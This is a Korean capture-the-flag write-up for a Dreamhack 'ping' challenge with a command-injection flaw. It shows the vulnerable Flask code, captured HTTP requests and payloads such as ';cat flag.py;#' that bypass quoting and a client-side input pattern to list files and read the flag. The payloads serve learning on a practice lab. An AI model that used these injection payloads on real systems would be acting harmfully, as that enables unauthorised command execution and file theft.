@@ -1,0 +1,164 @@
+PING 8.8.8.8 (8.8.8.8): 56 data bytes
+64 bytes from 8.8.8.8: seq=0 ttl=42 time=1.515 ms
+64 bytes from 8.8.8.8: seq=1 ttl=42 time=1.789 ms
+64 bytes from 8.8.8.8: seq=2 ttl=42 time=1.788 ms
+
+--- 8.8.8.8 ping statistics ---
+3 packets transmitted, 3 packets received, 0% packet loss
+round-trip min/avg/max = 1.515/1.697/1.789 ms
+FLAG = 'DH{pingpingppppppppping!!}'
+
+
+
+POST /ping HTTP/1.1
+Host: host1.dreamhack.games:13442
+Content-Length: 26
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://host1.dreamhack.games:13442
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://host1.dreamhack.games:13442/ping
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+host=8.8.8.8";cat flag.py"
+
+Burp Suite를 이용해 중간에 user input을 변경했다.
+HTML 코드를 보면 
+<input type="text" class="form-control" id="Host" placeholder="8.8.8.8" name="host" pattern="[A-Za-z0-9.]{5,20}" required>
+패턴이 지정되 command injection을 위한 meta 문자 ;, && 등을 사용할 수 없었다.
+그래서 user input을 패턴에 맞게 submit을 한 후 burp suite를 이용해 flag.py의 위치를 찾았다.
+
+host=8.8.8.8";"ls
+
+flag.py는 같은 디렉터리에 있었고 내용을 출력하기 위해 
+
+host=8.8.8.8";"cat flag.py 를 했으나 에러가 나오면서 제대로된 값을 얻지 못했다.
+
+왜 에러가 났는지 :
+    cmd = f'ping -c 3 "{host}"'
+    {host} 부분이 8.8.8.8";"ls일 때 cmd는 ping -c 3 "8.8.8.8";"ls"가 되고 여기서 "ls"는 괜찮습니다.
+
+    {host} 부분이 8.8.8.8";"cat flag.py이 된다면 "cat flag.py"에서 문제가 발생합니다.
+
+    우분투 명령어 체계는 <프로그램 주소(인자0)> <인자1> <인자2> <인자3> ... 형식으로 구성되어 있습니다.
+
+    이때 <프로그램 주소>는 /bin/ls나 /bin/cat 같은 것이 올 수 있고, /bin/에 있는 프로그램은 앞의 주소를 생략하고 프로그램명만 써도 괜찮습니다($PATH 환경 변수 참고). 만약 프로그램의 이름이나 주소에 띄어 쓰기가 포함된 경우 큰 따옴표 ""로 묶어서 사용할 수 있습니다. 그러므로 "cat flag.py"는 flag.py를 인자로 생각하지 않고 통째로 "cat flag.py"를 프로그램으로 생각하기 때문에 문제가 발생합니다.
+    실제로 우분투에 "cat flag.py" 명령을 입력해보면
+
+    cat flag.py: command not found
+    과 같이 오류가 발생합니다.
+
+결국 "" 를 회피해 command를 작성해 flag를 획득했다.
+
+host=8.8.8.8"; cat "flag.py
+Or
+host=8.8.8.8"; cat flag.py "
+
+
+
+다른 사람의 답:
+
+    ping에서 command injection 발생 확인
+    @APP.route('/ping', methods=['GET', 'POST'])
+    def ping():
+        if request.method == 'POST':
+            host = request.form.get('host')
+            cmd = f'ping -c 3 "{host}"'
+            try:
+                output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
+                return render_template('ping_result.html', data=output.decode('utf-8'))
+            except subprocess.TimeoutExpired:
+                return render_template('ping_result.html', data='Timeout !')
+            except subprocess.CalledProcessError:
+                return render_template('ping_result.html', data=f'an error occurred while executing the command. -> {cmd}')
+
+        return render_template('ping.html')
+    인젝션
+    POST /ping HTTP/1.1
+    Host: host1.dreamhack.games:8384
+    Content-Length: 12
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    Origin: http://host1.dreamhack.games:8384
+    Content-Type: application/x-www-form-urlencoded
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Referer: http://host1.dreamhack.games:8384/ping
+    Accept-Encoding: gzip, deflate
+    Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+    Connection: close
+
+    host=8.8.8.8";cat fla*"
+    결과화면
+    PING 8.8.8.8 (8.8.8.8): 56 data bytes
+    64 bytes from 8.8.8.8: seq=0 ttl=42 time=1.334 ms
+    64 bytes from 8.8.8.8: seq=1 ttl=42 time=1.640 ms
+    64 bytes from 8.8.8.8: seq=2 ttl=42 time=1.616 ms
+
+    --- 8.8.8.8 ping statistics ---
+    3 packets transmitted, 3 packets received, 0% packet loss
+    round-trip min/avg/max = 1.334/1.530/1.640 ms
+    FLAG = 'DH{~~~~~~~~~~~~~~~}'
+
+
+    F12 개발자 도구로 입력 폼을 살피면
+    <input type="text" class="form-control" id="Host" placeholder="8.8.8.8" name="host" pattern="[A-Za-z0-9.]{5,20}" required="">
+    여기서 pattern="[A-Za-z0-9.]{5,20}"가 원하는 문자를 입력하는데 방해되므로 이 부분을 더블 클릭후 삭제.
+
+    그리고 입력 폼에다가
+    127.0.0.1"; cat flag.py; echo "
+    을 입력하면 된다.
+
+
+
+    curl 'http://host1.dreamhack.games:8476/ping'   
+    -H 'Connection: keep-alive'   
+    -H 'Cache-Control: max-age=0'   
+    -H 'Upgrade-Insecure-Requests: 1'   
+    -H 'Origin: http://host1.dreammes:8476'   
+    -H 'Content-Type: application/x-www-form-urlencoded'   
+    -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36'   
+    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   
+    -H 'Referer: http://host1.dreamhack.games:8476/ping'   
+    -H 'Accept-Language: en-US,en;q=0.9,ko;q=0.8'   --data-raw 'host=127.0.0.1"'';''"cat"'' ''"flag.py'   --compressed   --insecure
+
+
+    ";ls -al;#
+    와 같이 보내면 다음과 같은 응답값을 확인할 수 있다.
+
+    total 32
+    drwxr-xr-x    1 dreamhac dreamhac      4096 Jan  4 05:03 .
+    drwxr-xr-x    1 root     root          4096 Jan  4 05:03 ..
+    drwxr-xr-x    2 dreamhac dreamhac      4096 Jan  4 05:03 __pycache__
+    -rwxr-xr-x    1 root     root           955 Apr  1  2020 app.py
+    -rw-r--r--    1 root     root            36 Apr  1  2020 flag.py
+    -rwxr-xr-x    1 root     root             5 Apr  1  2020 requirements.txt
+    drwxr-xr-x    5 root     root          4096 Apr  1  2020 static
+    drwxr-xr-x    2 root     root          4096 Apr  1  2020 templates
+    flag.py를 열어주면 될 것 같다.
+
+    ";cat flag.py;#
+    FLAG = 'DH{pingpingppppppppping!!}'
+    # : comment 처리
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
